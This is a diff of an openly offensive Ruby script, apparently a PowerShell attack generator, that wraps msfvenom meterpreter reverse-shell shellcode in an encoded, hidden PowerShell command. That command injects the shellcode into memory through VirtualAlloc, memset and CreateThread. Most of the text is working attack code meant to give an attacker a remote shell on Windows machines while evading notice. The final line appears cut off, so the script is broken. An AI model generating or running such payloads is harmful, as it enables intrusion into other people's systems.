@@ -1,6 +1,7 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.5
+#v1.6
+#Tested with Reverse_tcp, Reverse_https, and Reverse_tcp_dns meterpreters
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'open3'
 require 'base64'
@@ -174,7 +175,7 @@ def generate_shellcode (payload, lhost, lport)
 	newVar = ''
 	formattedShellcode = ''
 	#Build the msfvenom command from user input
-	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
+	command = ("sudo /usr/local/share/msf/msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
 	puts "Now running " +  command
 	puts " "
 	#Executes the built msfvenom command and assigns output to variable newVar
@@ -188,7 +189,7 @@ def generate_shellcode (payload, lhost, lport)
 end
 def gen_command(shellcode)
 	str = <<-EOS
-	$var = '$RgJTJokYRNwbHQ = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$JLOgmnlpEHlaQgk = Add-Type -memberDefinition $RgJTJokYRNwbHQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $xuigDWqpcchqI = shellcodehere;$cDPWgScbWjEED = $JLOgmnlpEHlaQgk::VirtualAlloc(0,[Math]::Max($xuigDWqpcchqI.Length,0x1000),0x3000,0x40);for ($OArfsQVSOrBoW=0;$OArfsQVSOrBoW -le ($xuigDWqpcchqI.Length-1);$OArfsQVSOrBoW++){$JLOgmnlpEHlaQgk::memset([IntPtr]($cDPWgScbWjEED.ToInt32()+$OArfsQVSOrBoW), $xuigDWqpcchqI[$OArfsQVSOrBoW], 1) | Out-Null};$JLOgmnlpEHlaQgk::CreateThread(0,0,$cDPWgScbWjEED,0,0,0);for (;;){Start-sleep 60};';$newVar = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($var));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -enc ";iex $cmd $newVar}else{iex "$var"};
+	$v = '$R = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$J = Add-Type -memberDefinition $R -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $x = shellcodehere;$C = $J::VirtualAlloc(0,[Math]::Max($x.Length,0x1000),0x3000,0x40);for ($A=0;$A -le ($x.Length-1);$A++){$J::memset([IntPtr]($C.ToInt32()+$A), $x[$A], 1) | Out-Null};$J::CreateThread(0,0,$C,0,0,0);for(;;){Start-sleep 60};';$n = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($v));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -enc ";iex $cmd $n}else{iex "$v"};
 EOS
 	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
 	return mainStr
@@ -227,4 +228,4 @@ else
 	else
 	puts "You forgot to specify a payload extension."
 	end
-end
+en
